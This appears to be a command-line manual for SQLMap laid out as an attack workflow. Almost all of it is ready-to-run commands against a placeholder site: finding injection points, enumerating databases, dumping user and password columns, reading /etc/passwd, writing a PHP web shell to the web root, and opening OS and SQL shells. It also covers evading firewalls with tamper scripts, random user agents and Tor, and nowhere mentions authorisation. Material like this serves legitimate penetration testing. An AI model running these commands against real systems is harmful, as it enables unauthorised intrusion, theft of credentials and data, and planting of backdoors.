# SQLMap Manual

## Core Workflow Details

### 1. Target Identification
Identify potential SQL injection points:

**GET Parameters**:
```bash
# Single URL with parameter
sqlmap -u "http://example.com/product?id=1"

# Multiple parameters
sqlmap -u "http://example.com/search?query=test&category=all&sort=name"

# Test all parameters
sqlmap -u "http://example.com/page?id=1&name=test" --level=5 --risk=3
```

**POST Requests**:
```bash
# POST data directly
sqlmap -u "http://example.com/login" --data="user=admin&pass=test"

# From Burp Suite request file
sqlmap -r login_request.txt

# With additional headers
sqlmap -u "http://example.com/api" --data='{"user":"admin"}' --headers="Content-Type: application/json"
```

**Cookies and Headers**:
```bash
# Test cookies
sqlmap -u "http://example.com/" --cookie="sessionid=abc123; role=user"

# Test custom headers
sqlmap -u "http://example.com/" --headers="X-Forwarded-For: 1.1.1.1\nUser-Agent: Test"

# Test specific injection point
sqlmap -u "http://example.com/" --cookie="sessionid=abc123*; role=user"
```

### 2. Detection and Fingerprinting
```bash
# Basic detection
sqlmap -u "http://example.com/page?id=1"

# Aggressive testing (higher risk)
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3

# Specify technique
sqlmap -u "http://example.com/page?id=1" --technique=BEUSTQ

# Detect DBMS
sqlmap -u "http://example.com/page?id=1" --fingerprint

# Force specific DBMS
sqlmap -u "http://example.com/page?id=1" --dbms=mysql
```

**Injection Techniques**:
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: UNION query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

### 3. Database Enumeration
```bash
# List databases
sqlmap -u "http://example.com/page?id=1" --dbs

# Current database
sqlmap -u "http://example.com/page?id=1" --current-db

# List tables in database
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --columns

# Database users
sqlmap -u "http://example.com/page?id=1" --users

# Database user privileges
sqlmap -u "http://example.com/page?id=1" --privileges
```

### 4. Data Extraction
```bash
# Dump specific table
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# Dump specific columns
sqlmap -u "http://example.com/page?id=1" -D database_name -T users -C username,password --dump

# Dump all databases (use with caution)
sqlmap -u "http://example.com/page?id=1" --dump-all

# Exclude system databases
sqlmap -u "http://example.com/page?id=1" --dump-all --exclude-sysdbs

# Search for specific data
sqlmap -u "http://example.com/page?id=1" -D database_name --search -C password
```

### 5. Advanced Exploitation
**File System Access**:
```bash
# Read file from server
sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"

# Write file to server (very invasive)
sqlmap -u "http://example.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**OS Command Execution**:
```bash
# Execute OS command
sqlmap -u "http://example.com/page?id=1" --os-cmd="whoami"

# Get OS shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# Get SQL shell
sqlmap -u "http://example.com/page?id=1" --sql-shell
```

## WAF Bypass and Evasion
```bash
# Use tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between

# Random User-Agent
sqlmap -u "http://example.com/page?id=1" --random-agent

# Add delay between requests
sqlmap -u "http://example.com/page?id=1" --delay=2

# Use Tor
sqlmap -u "http://example.com/page?id=1" --tor --check-tor
```

**Common Tamper Scripts**:
- `space2comment`: Replace space with comments
- `between`: Replace equals with BETWEEN
- `charencode`: URL encode characters
- `randomcase`: Random case for keywords

## Common Patterns

### Pattern 1: Basic Vulnerability Assessment
```bash
sqlmap -u "http://example.com/page?id=1" --batch
sqlmap -u "http://example.com/page?id=1" --dbs --batch
sqlmap -u "http://example.com/page?id=1" --current-user --current-db --is-dba --batch
```

### Pattern 2: Authentication Bypass Testing
```bash
sqlmap -u "http://example.com/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --technique=BE \
  --batch
```

## Troubleshooting

### Issue: False Positives
```bash
# Increase detection accuracy
sqlmap -u "http://example.com/page?id=1" --string="Welcome" --not-string="Error"

# Use specific technique
sqlmap -u "http://example.com/page?id=1" --technique=U
```

### Issue: WAF Blocking Requests
```bash
# Use tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between --random-agent

# Add delays
sqlmap -u "http://example.com/page?id=1" --delay=3 --randomize
```
